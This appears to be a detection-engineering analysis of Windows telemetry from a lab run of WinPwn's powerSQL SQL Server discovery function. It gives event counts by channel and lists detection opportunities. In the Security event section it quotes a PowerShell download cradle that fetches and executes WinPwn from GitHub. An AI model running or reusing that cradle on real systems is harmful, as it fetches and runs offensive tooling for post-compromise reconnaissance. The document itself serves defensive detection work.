# T1518-6: Software Discovery — WinPwn powerSQL

## Technique Context

T1518 (Software Discovery) includes enumeration of database software as a high-value post-compromise reconnaissance objective. SQL Server instances — including Express and developer editions common on enterprise workstations — represent targets for lateral movement, privilege escalation via xp_cmdshell, and data exfiltration. WinPwn's `powerSQL` function discovers SQL Server instances on the local host and, in some configurations, attempts service interaction.

The delivery mechanism is identical to T1518-4 and T1518-5: `iex(new-object net.webclient).downloadstring()` fetching WinPwn from a commit-pinned GitHub URL via `Invoke-Expression`. This is the third in a series of WinPwn function tests in this batch. The defended variant (92 events: 51 PowerShell, 48 Sysmon, 10 Security) had AMSI block the script after download; this undefended run shows the complete execution including SQL discovery activity.

## What This Dataset Contains

The dataset spans approximately 11 seconds (2026-03-17 17:05:10–17:05:21 UTC) on ACME-WS06 running as NT AUTHORITY\SYSTEM. It contains 172 events across three channels: 125 PowerShell, 42 Sysmon, and 4 Security — plus 1 Application event.

**Security (4 events, EID 4688):** Four process creation events. Two capture `whoami.exe` (test framework pre-flight and post-execution check). The third is the defining event: a child `powershell.exe` spawned with the full WinPwn `powerSQL` download cradle:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput}
```

The fourth is the cleanup invocation (`"powershell.exe" & {}`). All four run as `NT AUTHORITY\SYSTEM` with creator PID `0x4290`.

**Sysmon (42 events, EIDs 1, 3, 7, 10, 11, 17, 22):** Sysmon EID 1 captures four process creations: both `whoami.exe` invocations (tagged `T1033`) and the WinPwn `powershell.exe` (tagged `T1059.001`) with the full command line including function name `powerSQL`. An additional EID 1 may capture the cleanup phase. EID 22 (DnsQuery) captures a DNS resolution for `raw.githubusercontent.com` returning `185.199.108-111.133` — the four GitHub CDN IPs. EID 3 (NetworkConnect) records a TCP connection from `powershell.exe` to `185.199.109.133:443`, confirming the download cradle executed and the WinPwn script was fetched. This contrasts with the T1518-4 defended variant where EID 3 showed Defender's cloud protection connections rather than PowerShell's connection.

Sysmon EID 7 records 25 DLL loads. Notably, EID 11 records four file creation events in this dataset — compared to two in T1518-4 and T1518-5. Sysmon EID 10 fires four times (ProcessAccess, `T1055.001`). EID 17 records three named pipe creates (`\PSHost.*`).

**PowerShell (125 events, EIDs 4100, 4103, 4104):** The count is slightly higher than T1518-4 and T1518-5 (114 each), reflecting additional script blocks generated by `powerSQL`'s broader discovery logic — SQL Server enumeration involves additional PowerShell module loading or service query activity. EID 4104 captures 120 script block entries. EID 4103 records 4 module logging events (vs. 2 in the `Dotnetsearch` run), indicating more cmdlet invocations executed during `powerSQL`. EID 4100 records 1 error event.

**Application (1 event, EID 15):** As in T1518-5, EID 15 records `Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON` — background Security Center state tracking, not caused by the technique.

## What This Dataset Does Not Contain

- **No SQL Server discovery output.** Whether SQL Server was found on ACME-WS06 and what was returned is not visible in event logs. The function ran (`powerSQL -noninteractive -consoleoutput`), but its stdout is not captured.
- **No AMSI block.** In the defended variant, the `powerSQL` script was blocked after download. That error event is absent here.
- **No named pipe or SMB connection events** that would indicate `powerSQL` attempted to connect to discovered SQL instances — if such connections were attempted, they may have produced EID 3 entries not present in the surfaced 20 Sysmon samples.
- **No `sqlcmd.exe`, `osql.exe`, or `SQLPS` process creations** — `powerSQL` in non-interactive mode performs discovery but does not appear to have spawned separate SQL client tools on this host.

## Assessment

This dataset completes the three-test WinPwn series (T1518-4 Dotnetsearch, T1518-5 DotNet, T1518-6 powerSQL) with a consistent behavioral profile. All three use the same commit-pinned download cradle, the same `-noninteractive -consoleoutput` flags, and the same parent PowerShell test framework. The distinguishing element is the function name in the command line.

The powerSQL variant generates slightly more telemetry than its siblings: 125 vs. 114 PowerShell events and 4 vs. 2 EID 4103 module logging records. The four EID 11 file create events (vs. two in the other tests) may reflect WinPwn's SQL discovery writing temporary output or loading additional modules. The presence of a confirmed EID 3 network connection to GitHub CDN in this dataset — where T1518-4 showed Defender connections instead and T1518-5 showed no EID 3 — demonstrates that network visibility varies based on Sysmon's process tracking at the exact moment of connection.

Across all three WinPwn tests, the Security EID 4688 command line is the most reliable indicator: it is present in all three, contains the full URL, function name, and flags, and persists regardless of the DNS/network visibility variations in Sysmon.

## Detection Opportunities Present in This Data

- **Security EID 4688 command line:** `powerSQL -noninteractive -consoleoutput` combined with the WinPwn GitHub URL is the primary indicator. The parent-child PowerShell spawn pattern with a raw GitHub URL is consistent across all WinPwn tests.
- **Sysmon EID 22 (DnsQuery):** `raw.githubusercontent.com` queried by `powershell.exe` is captured here. Correlating this DNS event with the subsequent EID 1 process creation carrying a `downloadstring` command line closes the behavioral chain.
- **Sysmon EID 3 (NetworkConnect):** The TCP connection from `powershell.exe` to `185.199.109.133:443` (GitHub CDN) is directly captured, providing a network-level indicator that complements the command-line evidence.
- **Sysmon EID 7 (ImageLoad):** The 25 DLL loads into PowerShell — particularly `.NET` runtime libraries following a download cradle — reflect WinPwn's framework loading behavior and are consistent across all three WinPwn tests in this series.
- **PowerShell EID 4103 (module logging):** The four EID 4103 records in this test (vs. two in T1518-4) indicate additional cmdlet activity from `powerSQL` relative to `Dotnetsearch`. Module logging thus provides a coarse signal for technique-function-level differentiation within the WinPwn framework.
